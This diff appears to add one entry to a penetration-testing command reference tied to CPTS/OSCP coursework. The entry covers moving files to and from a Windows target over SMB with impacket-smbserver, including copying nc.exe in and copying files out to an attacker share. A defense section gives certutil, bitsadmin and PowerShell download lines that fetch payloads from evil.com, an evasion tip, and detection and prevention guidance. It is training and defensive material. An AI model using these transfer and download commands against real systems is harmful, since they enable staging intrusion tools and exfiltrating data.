@@ -1,0 +1,131 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tools": [
+    "impacket",
+    "smbserver"
+  ],
+  "tags": [
+    "windows",
+    "smb",
+    "impacket"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Windows Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "CPTS Ch07 — serve /tmp/smbshare unauthenticated, copy nc.exe",
+      "command": "# Attacker:\nsudo impacket-smbserver share -smb2support /tmp/smbshare\n# Target:\ncopy \\\\192.168.220.133\\share\\nc.exe"
+    },
+    {
+      "label": "Authenticated share (bypass guest block)",
+      "command": "# Attacker:\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n# Target:\nnet use n: \\\\192.168.220.133\\share /user:test test\ncopy n:\\nc.exe"
+    }
+  ],
+  "notes": "`impacket-smbserver share . -smb2support` on the attacker, then `copy \\\\<lhost>\\share\\file .` on Windows. Fast and native. Add `-user/-password` since Win10+ blocks guest SMB. Modern Windows blocks unauthenticated guest SMB access — add -user/-password when that error appears. Use 'net use' to mount share persistently. impacket-smbserver auto-handles SMBv2 with -smb2support. Also covered in: CPTS Ch07 (File Transfers).",
+  "references": [
+    {
+      "title": "Impacket smbserver.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/smbserver.py"
+    },
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-ps-download",
+      "rel": "alternative",
+      "note": "HTTP download cradle."
+    },
+    {
+      "id": "findstr-hunt",
+      "rel": "next",
+      "note": "Search the box for secrets."
+    }
+  ],
+  "id": "win-smb-transfer",
+  "name": "Windows - SMB Transfer (Impacket)",
+  "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+  "description": "Stand up an SMB server on your attack host, then map it and copy files from the Windows target. Add credentials if the target blocks unauthenticated guest SMB.",
+  "steps": [
+    {
+      "label": "1. Start SMB server (attacker)",
+      "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare\n# with auth: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
+    },
+    {
+      "label": "2. Map + copy (target)",
+      "command": "net use n: \\\\192.168.220.133\\share /user:test test\ncopy n:\\nc.exe\n# or directly: copy \\\\192.168.220.133\\share\\nc.exe"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Copying files over SMB (e.g. from an attacker impacket smbserver) uses TCP 445, which enterprises frequently allow outbound even when HTTP/FTP are filtered - exactly the module scenario (445 allowed when 21 and web were blocked).",
+    "prerequisites": "Code execution on Windows, an attacker SMB share reachable on 445, and outbound 445 permitted.",
+    "impact": "Files moved on/off the target over an allowed channel - commonly used to stage privesc binaries or exfil sensitive data.",
+    "detection": "Outbound SMB (445) to a non-domain/external host is anomalous; new file on disk; the copy/net-use command line (4688 / Sysmon 1). SMB to an unknown server IP is a strong indicator.",
+    "artifacts": "An SMB session to the attacker IP on 445; the copied file; net use / copy command lines.",
+    "prevention": "[MITRE T1105 M1037] Block outbound 445 to non-internal hosts - SMB should never egress the perimeter - and segment/monitor internal SMB. [M1031] IDS/IPS on SMB file writes; EDR on the copy activity.",
+    "evasion": "SMB blends where 445 is broadly allowed internally; authenticate the share (impacket -user/-pass) so it resembles a normal file server; encrypt the payload before transfer.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  },
+  "variations": [
+    {
+      "description": "Start unauthenticated SMB share (attacker/Linux)",
+      "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "label": "SMB server"
+    },
+    {
+      "description": "Start authenticated SMB share (bypasses guest-access policy)",
+      "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare -user <user> -password <pass>",
+      "label": "SMB server"
+    },
+    {
+      "description": "Download from unauthenticated share (Windows target)",
+      "command": "copy \\\\<attacker_ip>\\share\\nc.exe",
+      "label": "SMB copy in"
+    },
+    {
+      "description": "Mount authenticated share then copy (Windows target)",
+      "command": "net use n: \\\\<attacker_ip>\\share /user:<user> <pass>\ncopy n:\\nc.exe",
+      "label": "Map drive + copy"
+    },
+    {
+      "description": "Upload file to SMB share from Windows",
+      "command": "copy C:\\Users\\user\\file.txt \\\\<attacker_ip>\\share\\file.txt",
+      "label": "SMB copy out"
+    },
+    {
+      "description": "Mount share and copy multiple files",
+      "command": "net use n: \\\\<attacker_ip>\\share /user:<user> <pass>\ncopy n:\\*.exe C:\\Tools\\",
+      "label": "net"
+    }
+  ]
+}
